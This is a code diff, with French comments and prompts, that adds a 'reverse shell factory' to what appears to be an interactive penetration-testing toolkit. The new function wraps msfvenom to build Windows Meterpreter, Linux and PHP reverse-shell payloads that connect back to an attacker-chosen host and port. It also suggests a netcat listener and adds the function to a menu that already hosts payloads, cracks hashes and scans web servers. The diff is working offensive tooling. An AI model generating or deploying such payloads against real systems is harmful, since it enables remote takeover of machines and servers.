@@ -447,6 +447,58 @@ def serve_payloads():
     httpd.shutdown()
     console.print("[dim]Serveur coupé. Retour à la base.[/dim]")
 
+# --- ÉTAPE 12 : USINE À REVERSE SHELLS (MSFVENOM) ---
+def generate_payload():
+    console.print("\n[bold red]☣️ USINE À REVERSE SHELLS (Générateur msfvenom) ☣️[/bold red]")
+    
+    # Création du dossier d'armes s'il n'existe pas déjà
+    dossier_outils = "arsenal_payloads"
+    if not os.path.exists(dossier_outils):
+        os.makedirs(dossier_outils)
+
+    choix_os = questionary.select(
+        "Pour quel système veux-tu forger une arme ?",
+        choices=[
+            "1. Windows (.exe) - Meterpreter",
+            "2. Linux (.elf) - Bash standard",
+            "3. Web (.php) - Idéal pour les failles d'upload",
+            "4. Annuler"
+        ]
+    ).ask()
+
+    if not choix_os or "4." in choix_os: return
+
+    lhost = questionary.text("Ton adresse IP attaquante (LHOST, ex: tun0) :", default="tun0").ask()
+    lport = questionary.text("Ton port d'écoute (LPORT, ex: 4444) :", default="4444").ask()
+    nom_fichier = questionary.text("Nom du fichier de sortie :", default="payload").ask()
+
+    # Configuration des paramètres selon l'OS choisi
+    if "1." in choix_os:
+        payload = "windows/x64/meterpreter/reverse_tcp"
+        format_out = "exe"
+        ext = ".exe"
+    elif "2." in choix_os:
+        payload = "linux/x64/shell_reverse_tcp"
+        format_out = "elf"
+        ext = ".elf"
+    elif "3." in choix_os:
+        payload = "php/reverse_php"
+        format_out = "raw"
+        ext = ".php"
+
+    chemin_final = os.path.join(dossier_outils, f"{nom_fichier}{ext}")
+
+    console.print(f"\n[bold yellow][*] Forge en cours : Création de {chemin_final}...[/bold yellow]")
+    
+    try:
+        # Lancement de la commande msfvenom
+        commande = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", format_out, "-o", chemin_final]
+        subprocess.run(commande, check=True)
+        console.print(f"[bold green]✅ Payload généré avec succès dans '{chemin_final}' ![/bold green]")
+        console.print(f"[dim]Astuce : Ouvre un terminal et tape 'nc -lvnp {lport}' pour écouter la connexion entrante (sauf pour meterpreter où tu dois utiliser msfconsole).[/dim]\n")
+    except Exception as e:
+        console.print(f"[bold red]Erreur lors de la génération : {e}[/bold red]")
+
 # --- MENU PRINCIPAL (INTERACTIF) ---
 def interactive_menu(ip, open_ports):
     while True:
@@ -471,7 +523,8 @@ def interactive_menu(ip, open_ports):
                 "8. 💀 Cassage de Hashs hors-ligne (John The Ripper)",
                 "9. ☢️ Scanner de Vulnérabilités Web (Nikto)",
                 "10. 🚁 Héberger/Distribuer des payloads (Serveur Web local)",
-                "11. 🚪 Générer Rapport & Quitter"
+                "11. ☣️ Usine à Reverse Shells (Générer des Payloads)",
+                "12. 🚪 Générer Rapport & Quitter"
             ]
         ).ask()
         
@@ -487,7 +540,8 @@ def interactive_menu(ip, open_ports):
         elif "8." in choix: run_cracker()
         elif "9." in choix: run_vuln_scanner(ip, open_ports)
         elif "10." in choix: serve_payloads()
-        elif "11." in choix: 
+        elif "11." in choix: generate_payload()
+        elif "12." in choix:
             generer_html()
             break
 
